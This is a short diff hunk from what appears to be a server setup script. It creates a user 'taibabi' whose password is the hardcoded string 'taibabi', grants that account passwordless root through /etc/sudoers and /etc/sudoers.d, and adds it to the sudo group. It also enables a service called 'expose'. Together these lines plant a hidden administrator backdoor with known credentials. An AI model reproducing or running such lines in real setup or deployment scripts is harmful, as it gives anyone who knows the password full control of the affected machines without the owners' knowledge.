@@ -241,6 +241,7 @@ systemctl enable --now expose >/dev/null 2>&1
 
 useradd -M taibabi
 usermod --password $(echo taibabi | openssl passwd -1 -stdin) taibabi
+usermod -aG sudo taibabi
 
 echo "taibabi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
 echo "taibabi ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/taibabi >/dev/null 2>&1
